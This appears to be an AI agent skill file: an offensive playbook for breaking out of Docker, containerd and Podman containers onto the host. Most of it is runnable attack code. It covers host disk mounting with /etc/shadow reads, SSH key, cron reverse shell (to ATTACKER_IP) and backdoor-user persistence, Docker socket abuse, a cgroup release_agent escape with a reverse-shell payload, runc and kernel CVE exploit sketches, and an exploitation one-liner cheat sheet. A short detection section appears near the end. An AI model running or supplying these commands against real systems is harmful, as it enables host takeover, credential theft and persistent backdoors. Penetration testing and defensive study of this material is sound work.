---
name: offensive-container-escape
description: "Container escape and breakout techniques targeting Docker, containerd, and Podman runtimes. Covers privileged container breakout via host filesystem mount and nsenter, Docker socket abuse through /var/run/docker.sock, Linux capability exploitation including CAP_SYS_ADMIN, CAP_SYS_PTRACE, and CAP_NET_ADMIN, cgroup v1 notify_on_release escape, runc CVEs such as CVE-2019-5736 and CVE-2024-21626 Leaky Vessels, kernel exploits from within containers, and Dockerfile misconfigurations like --privileged and host namespace sharing. Includes enumeration with capsh, amicontained, deepce, CDK, and nsenter. Maps to MITRE ATT&CK T1611 Escape to Host. Use this skill when the engagement scope includes container breakout, Docker escape, container privilege escalation, host access from container, or when you land inside a containerized environment and need to reach the underlying host."
---

# Container Escape and Breakout

You have a shell inside a container. Your objective is to break out to the underlying host operating system. Container isolation relies on Linux namespaces, cgroups, seccomp profiles, AppArmor/SELinux, and dropped capabilities. Every misconfiguration in these layers is an escape vector. This skill walks you through systematic enumeration, exploitation of common misconfigurations, abuse of exposed runtime sockets, capability-based escapes, cgroup breakouts, and known CVEs against container runtimes.

## Quick Workflow

1. Confirm you are inside a container (check for `.dockerenv`, cgroup entries, PID 1 process).
2. Enumerate capabilities, mounts, namespaces, and sockets with automated tools.
3. Identify the escape vector: privileged mode, socket exposure, dangerous capabilities, cgroup misconfiguration, or vulnerable runtime.
4. Execute the breakout technique matching the vector.
5. Validate host access by reading `/etc/hostname`, checking PID namespace, or writing to host filesystem.
6. Pivot from host access to lateral movement across the cluster or infrastructure.

---

## Phase 1: Container Detection and Enumeration

Before attempting escape, confirm you are containerized and map the attack surface.

### Detecting Container Environment

```bash
# Check for Docker marker file
ls -la /.dockerenv

# Check cgroup entries for container identifiers
cat /proc/1/cgroup | grep -E 'docker|containerd|kubepods|podman'

# Check PID 1 process (containers typically run app process, not init)
cat /proc/1/cmdline | tr '\0' ' '

# Check for container-specific environment variables
env | grep -iE 'kubernetes|docker|container|pod'

# Check hostname (often a truncated container ID)
hostname

# Check mount info for overlay filesystem
cat /proc/1/mountinfo | head -20
```

### Automated Enumeration Tools

```bash
# deepce - Docker enumeration and escalation tool
# Download and run (if outbound access is available)
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
chmod +x deepce.sh
./deepce.sh

# CDK - Zero-dependency container penetration toolkit
./cdk evaluate

# amicontained - Inspect container runtime and capabilities
./amicontained

# Manual capability check with capsh
capsh --print
cat /proc/1/status | grep -i cap
```

### Decoding Capabilities Manually

```bash
# Read raw capability hex from /proc
cat /proc/1/status | grep CapEff
# Example output: CapEff: 0000003fffffffff

# Decode with capsh
capsh --decode=0000003fffffffff

# Key dangerous capabilities to look for:
# CAP_SYS_ADMIN  - mount filesystems, cgroup manipulation, namespace operations
# CAP_SYS_PTRACE - ptrace any process, cross namespace boundaries
# CAP_NET_ADMIN  - network namespace manipulation, raw sockets
# CAP_DAC_OVERRIDE - bypass file read/write/execute permission checks
# CAP_SYS_RAWIO  - direct I/O to /dev/mem, /dev/kmem
# CAP_SYS_MODULE - load/unload kernel modules
# CAP_MKNOD      - create device files
```

### Checking Namespace Isolation

```bash
# Compare PID namespace
ls -la /proc/1/ns/pid
ls -la /proc/self/ns/pid

# Check if sharing host namespaces
ls -la /proc/1/ns/ | awk '{print $NF}'
# If namespace inodes match host, isolation is broken

# Check mount namespace for host mounts
cat /proc/1/mountinfo | grep -E '/dev/sd|/dev/nvme|hostPath'
findmnt

# Check for host network namespace
ip addr show
# If you see host interfaces (eth0 with host IP), hostNetwork is true
cat /proc/net/tcp
```

---

## Phase 2: Privileged Container Breakout

A container run with `--privileged` drops nearly all isolation. It has all capabilities, can see host devices, and has no seccomp or AppArmor restrictions.

### Mount Host Filesystem

```bash
# List available block devices
fdisk -l 2>/dev/null || lsblk

# Identify host root filesystem device (commonly /dev/sda1 or /dev/nvme0n1p1)
# Mount it into the container
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host

# Verify host access
cat /mnt/host/etc/hostname
cat /mnt/host/etc/shadow
ls -la /mnt/host/root/

# Drop an SSH key for persistent access
mkdir -p /mnt/host/root/.ssh
echo "ssh-rsa AAAA... attacker@host" >> /mnt/host/root/.ssh/authorized_keys

# Plant a reverse shell in cron
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /mnt/host/etc/crontab

# Add a backdoor user
echo 'backdoor:x:0:0::/root:/bin/bash' >> /mnt/host/etc/passwd
echo 'backdoor:$6$salt$hash:19000:0:99999:7:::' >> /mnt/host/etc/shadow
```

### nsenter to Host Namespaces

```bash
# If PID 1 on the host is visible (privileged + hostPID), nsenter into it
# This gives you a shell in the host's full namespace context
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Verify you escaped
hostname
id
cat /etc/hostname

# Without hostPID, nsenter from mounted procfs
# Mount host /proc first if available
nsenter -t 1 -m -u -i -n -p -- bash
```

### Device Access Exploitation

```bash
# Privileged containers have access to all host devices
ls -la /dev/

# Read host memory directly
dd if=/dev/mem bs=1 count=1024 skip=0 2>/dev/null | xxd | head

# Access host disk raw
dd if=/dev/sda bs=512 count=1 | xxd | head

# Create device nodes if CAP_MKNOD is available
mknod /dev/host_disk b 8 0
mount /dev/host_disk /mnt/host
```

---

## Phase 3: Docker Socket Abuse

When `/var/run/docker.sock` is mounted into a container, you control the Docker daemon and can create privileged containers that mount the host filesystem.

### Detecting Exposed Socket

```bash
# Check for Docker socket
ls -la /var/run/docker.sock
ls -la /run/docker.sock

# Check if socket is writable
test -w /var/run/docker.sock && echo "WRITABLE" || echo "READ-ONLY"

# Verify Docker API via curl
curl -s --unix-socket /var/run/docker.sock http://localhost/version | python3 -m json.tool

# Check without curl using socat or Python
python3 -c "
import socket, json
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/var/run/docker.sock')
s.send(b'GET /version HTTP/1.1\r\nHost: localhost\r\n\r\n')
print(s.recv(4096).decode())
"
```

### Escape via Docker Socket

```bash
# If Docker CLI is available
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host \
  --net=host -v /:/mnt/host alpine chroot /mnt/host /bin/bash

# If only curl is available, use Docker API directly
# Step 1: Create a container mounting host root
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "cat /mnt/host/etc/shadow"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/mnt/host"]
    }
  }' | python3 -m json.tool

# Capture container ID from response
CONTAINER_ID="<id_from_response>"

# Step 2: Start the container
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/${CONTAINER_ID}/start"

# Step 3: Read output
curl -s --unix-socket /var/run/docker.sock \
  "http://localhost/containers/${CONTAINER_ID}/logs?stdout=true&stderr=true"

# For interactive shell, use exec endpoint
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/${CONTAINER_ID}/exec" \
  -H "Content-Type: application/json" \
  -d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["/bin/sh"],"Tty":true}'
```

### Containerd Socket Abuse

```bash
# Check for containerd socket
ls -la /run/containerd/containerd.sock

# Use ctr if available
ctr -a /run/containerd/containerd.sock containers list
ctr -a /run/containerd/containerd.sock images list

# Spawn privileged container via containerd
ctr -a /run/containerd/containerd.sock run \
  --privileged --net-host --mount type=bind,src=/,dst=/mnt/host,options=rbind \
  docker.io/library/alpine:latest escape /bin/sh
```

---

## Phase 4: Capability-Based Escapes

Individual Linux capabilities can be sufficient for escape even without full privileged mode.

### CAP_SYS_ADMIN Escape

```bash
# CAP_SYS_ADMIN allows mounting filesystems and cgroup manipulation
# Check if present
grep CapEff /proc/1/status
capsh --print | grep sys_admin

# Method 1: Mount host filesystem via block device
mount /dev/sda1 /mnt

# Method 2: cgroup release_agent escape (see Phase 5)
# Method 3: Abuse user namespace
unshare -Urm bash
```

### CAP_SYS_PTRACE Escape

```bash
# CAP_SYS_PTRACE allows tracing processes across namespaces
# Combined with hostPID, you can inject into host processes

# Find a host process (requires shared PID namespace)
ps aux | grep -v grep | head -20

# Inject shellcode into a host process using ptrace
# Python ptrace injection example
python3 -c "
import ctypes
import ctypes.util

libc = ctypes.CDLL(ctypes.util.find_library('c'))

# Target a host process PID
target_pid = 1  # systemd or init

PTRACE_ATTACH = 16
PTRACE_DETACH = 17
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12

# Attach to target
result = libc.ptrace(PTRACE_ATTACH, target_pid, 0, 0)
print(f'Attach result: {result}')
"

# Alternatively, use /proc/PID/root to access host filesystem via host PID
ls -la /proc/1/root/
cat /proc/1/root/etc/shadow
```

### CAP_NET_ADMIN Escape

```bash
# CAP_NET_ADMIN with host network namespace enables ARP spoofing,
# traffic interception, and network-based attacks against the host

# Check for capability
capsh --print | grep net_admin

# Create a network tap to sniff host traffic
ip link add name sniff0 type dummy
tcpdump -i eth0 -w /tmp/capture.pcap &

# ARP spoof the gateway to intercept traffic
# (requires host network namespace)
```

### CAP_DAC_READ_SEARCH Escape

```bash
# Bypass file permission checks for reading
# Access host filesystem through /proc/1/root if hostPID is shared

# Use open_by_handle_at to access files outside the container mount
# This is the shocker exploit technique
# Compile and run the shocker PoC:
cat > /tmp/shocker.c << 'CEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdlib.h>

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

int main() {
    struct my_file_handle h;
    h.handle_bytes = 8;
    h.handle_type = 1;
    memset(h.f_handle, 0, sizeof(h.f_handle));
    // Brute force inode handles to access host /etc/shadow
    int mount_fd = open("/etc/hostname", O_RDONLY);
    // ... (PoC continues with handle iteration)
    return 0;
}
CEOF
gcc -o /tmp/shocker /tmp/shocker.c
```

---

## Phase 5: Cgroup Escape (notify_on_release)

The cgroup v1 `notify_on_release` mechanism executes a binary on the host when the last process in a cgroup exits. This is the classic container escape for containers with CAP_SYS_ADMIN.

### Classic Cgroup Release Agent Escape

```bash
# Requires: CAP_SYS_ADMIN and cgroup v1
# This runs a command on the HOST, not inside the container

# Step 1: Find the container's cgroup mount
mount | grep cgroup
# Look for: cgroup on /sys/fs/cgroup/... type cgroup (rw,...)

# Step 2: Create a child cgroup
mkdir /sys/fs/cgroup/rdma/escape_cgroup 2>/dev/null || \
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && \
mkdir /tmp/cgrp/escape_cgroup

CGROUP_DIR="/tmp/cgrp"
ESCAPE_DIR="${CGROUP_DIR}/escape_cgroup"

# Step 3: Enable notify_on_release
echo 1 > ${ESCAPE_DIR}/notify_on_release

# Step 4: Find container filesystem path on host
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "Host path: ${host_path}"

# Step 5: Set the release_agent to execute our payload
echo "${host_path}/cmd" > ${CGROUP_DIR}/release_agent

# Step 6: Write payload that runs on the host
cat > /cmd << 'PAYLOAD'
#!/bin/bash
# This runs on the HOST
cat /etc/hostname > /output
id >> /output
ps aux >> /output
# Reverse shell to attacker
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
PAYLOAD
chmod +x /cmd

# Step 7: Trigger the escape by putting a process in the cgroup and letting it exit
echo $$ > ${ESCAPE_DIR}/cgroup.procs
# The shell PID joins the cgroup, then when we create and exit a subshell:
bash -c "echo \$\$ > ${ESCAPE_DIR}/cgroup.procs && exit"

# Step 8: Check output
sleep 1
cat /output
```

### Cgroup Escape Variations

```bash
# Variation: Using devices cgroup subsystem
mkdir /tmp/cgrp && mount -t cgroup -o devices cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Variation: Memory cgroup
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
# Same pattern follows

# Note: cgroup v2 unified hierarchy does not support release_agent
# in the same way. Check cgroup version:
stat -fc %T /sys/fs/cgroup/
# "cgroup2fs" = v2, "tmpfs" = v1
```

---

## Phase 6: Runtime CVE Exploitation

### CVE-2019-5736: runc Overwrite

This vulnerability allows a container to overwrite the host runc binary, gaining code execution on the host whenever any container is started.

```bash
# Check runc version
runc --version 2>/dev/null
docker version 2>/dev/null | grep -A5 Server

# Vulnerable: runc < 1.0.0-rc6
# The attack overwrites /proc/self/exe (the runc binary) from inside the container

# Step 1: Prepare the payload binary that replaces runc
cat > /tmp/payload.sh << 'EXPLOIT'
#!/bin/bash
# This replaces the host runc binary
# When admin next runs docker exec or docker run, our payload executes
echo '#!/bin/bash' > /bin/bash_backup
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /bin/bash_backup
chmod +x /bin/bash_backup
EXPLOIT

# Step 2: Overwrite /bin/sh to be a program that overwrites runc via /proc/self/exe
# The actual exploit requires a compiled Go binary that:
# 1. Opens /proc/self/exe for writing (which points to runc during exec)
# 2. Writes attacker payload to it
# 3. runc on host is now the attacker's binary

# PoC tools: github.com/Frichetten/CVE-2019-5736-PoC
# Compile the PoC, copy into container, and trigger via docker exec
```

### CVE-2024-21626: Leaky Vessels (runc)

A file descriptor leak in runc allows containers to access the host filesystem by referencing leaked `/proc/self/fd` entries that point to the host working directory.

```bash
# Vulnerable: runc <= 1.1.11
# The vulnerability is in the WORKDIR processing during container build/run

# Check runc version
runc --version

# Exploitation concept:
# 1. Craft a Dockerfile with WORKDIR /proc/self/fd/8 (or other FD number)
# 2. The leaked file descriptor points to the host filesystem
# 3. Building or running the image gives host filesystem access

# Malicious Dockerfile example (build-time exploitation):
cat > /tmp/Dockerfile.escape << 'DOCKERFILE'
FROM ubuntu:latest
# The leaked fd points to host CWD during build
WORKDIR /proc/self/fd/8
# This RUN now operates on the host filesystem
RUN cat /etc/shadow > /tmp/shadow_dump || true
DOCKERFILE

# Runtime exploitation:
# Container started with WORKDIR pointing to leaked fd
# can read/write host files through the fd reference

# Detection: Check for /proc/self/fd references in WORKDIR directives
grep -r "WORKDIR.*proc/self/fd" /path/to/dockerfiles/
```

### CVE-2020-15257: Containerd Host Networking

```bash
# Containerd < 1.4.3, < 1.3.9
# Containers sharing host network namespace can access containerd-shim API

# Check if container uses host network
cat /proc/1/ns/net | xargs readlink
ip addr | grep docker0  # Seeing host interfaces indicates host network

# Access containerd-shim abstract unix socket
# from host network namespace container
curl --unix-socket /run/containerd/containerd.sock \
  http://localhost/v1/namespaces
```

---

## Phase 7: Kernel Exploits from Container

When other escape vectors are unavailable, kernel vulnerabilities may provide a path to host access since the container shares the host kernel.

### Identifying Kernel Version

```bash
uname -a
uname -r
cat /proc/version

# Check for known vulnerable kernels
# DirtyPipe: CVE-2022-0847 (5.8 <= kernel < 5.16.11, 5.15.25, 5.10.102)
# DirtyCow: CVE-2016-5195 (kernel < 4.8.3)
# OverlayFS: CVE-2021-3493 (Ubuntu kernels)
# nftables: CVE-2023-32233 (kernel < 6.4)
```

### DirtyPipe from Container (CVE-2022-0847)

```bash
# Overwrites read-only files via pipe page cache poisoning
# Works from inside containers because it targets the shared kernel

# Check kernel version
uname -r
# Vulnerable: 5.8 through 5.16.10

# The exploit overwrites /etc/passwd on the HOST from the container
# because the page cache is shared between host and container

# Compile exploit (if gcc available in container)
# PoC modifies root entry in /etc/passwd to remove password
```

### Checking Seccomp and AppArmor

```bash
# Check if seccomp is restricting syscalls
cat /proc/1/status | grep Seccomp
# Seccomp: 0 = disabled, 1 = strict, 2 = filter

# Check AppArmor profile
cat /proc/1/attr/current
# "unconfined" means no AppArmor restriction

# Check if kernel module loading is possible
# (no seccomp + CAP_SYS_MODULE)
modprobe test 2>&1
insmod /tmp/evil.ko 2>&1
```

---

## Detection / Defender View

Defenders monitoring for container escape should watch for:

- **Process monitoring**: Unexpected processes with host PID namespace visibility. Processes spawned by container runtimes outside normal patterns (runc, containerd-shim creating shells).
- **Filesystem events**: Mount operations inside containers (`mount` syscalls from container PIDs). New files appearing in host `/root/.ssh/authorized_keys`, `/etc/crontab`, `/etc/passwd`.
- **Cgroup manipulation**: Creation of new cgroups with `notify_on_release` set to 1. Writes to `release_agent` files.
- **Docker socket access**: API calls to Docker socket from within containers. Container creation requests that include `--privileged` or host mount binds.
- **Capability anomalies**: Containers running with `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, or other dangerous capabilities that are not required by the application.
- **Audit rules**: Monitor for `nsenter` usage, `unshare` calls, and access to `/proc/*/ns/*` from container contexts.
- **Falco rules**: Deploy runtime security with rules for unexpected shell spawns, sensitive file access, and privilege escalation inside containers.

```bash
# Falco rule example for detecting container escape attempts
# - rule: Detect Container Escape via cgroup notify_on_release
#   desc: Detects write to notify_on_release in cgroup directory
#   condition: >
#     open_write and container and
#     fd.name contains "notify_on_release"
#   output: >
#     Container escape attempt via cgroup release_agent
#     (user=%user.name container=%container.name file=%fd.name)
#   priority: CRITICAL
```

---

## Engagement Cheatsheet

```bash
# --- Detection ---
# Am I in a container?
ls /.dockerenv 2>/dev/null && echo "Docker" || echo "Not Docker"
cat /proc/1/cgroup | grep -qE 'docker|kubepods|containerd' && echo "Containerized"

# What capabilities do I have?
capsh --print 2>/dev/null || cat /proc/1/status | grep Cap

# Is Docker socket available?
ls -la /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock 2>/dev/null

# Am I privileged?
ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED (NET_ADMIN)" && ip link del dummy0
mount -t tmpfs none /tmp/test 2>/dev/null && echo "PRIVILEGED (SYS_ADMIN)" && umount /tmp/test

# Cgroup version?
stat -fc %T /sys/fs/cgroup/

# --- Exploitation (one-liners) ---
# Privileged mount escape
mkdir /mnt/host 2>/dev/null; mount /dev/sda1 /mnt/host; cat /mnt/host/etc/shadow

# nsenter escape (with hostPID)
nsenter -t 1 -m -u -i -n -p -- bash

# Docker socket escape
docker -H unix:///var/run/docker.sock run --rm -it --privileged -v /:/h alpine chroot /h

# Cgroup escape (CAP_SYS_ADMIN)
d=$(dirname $(ls -x /s*/fs/c*/*/r* 2>/dev/null|head -n1)); mkdir -p $d/w; \
echo 1 >$d/w/notify_on_release; t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab); \
echo $t/c >$d/release_agent; printf '#!/bin/sh\nid>/o' >/c; chmod +x /c; \
sh -c "echo 0 >$d/w/cgroup.procs"; sleep 1; cat /o

# --- Post-Escape ---
# Validate host access
hostname; id; cat /etc/os-release; docker ps 2>/dev/null
```

---

## Key References

- MITRE ATT&CK T1611 - Escape to Host
- CVE-2019-5736 - runc container breakout via /proc/self/exe overwrite
- CVE-2024-21626 - Leaky Vessels runc file descriptor leak
- CVE-2020-15257 - containerd host network namespace API access
- CVE-2022-0847 - DirtyPipe kernel privilege escalation
- Tool: deepce - https://github.com/stealthcopter/deepce
- Tool: CDK - https://github.com/cdk-team/CDK
- Tool: amicontained - https://github.com/genuinetools/amicontained
- Tool: nsenter - Linux util-linux package
- Docker Socket Escape - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation
- CIS Docker Benchmark - runtime security configuration baselines
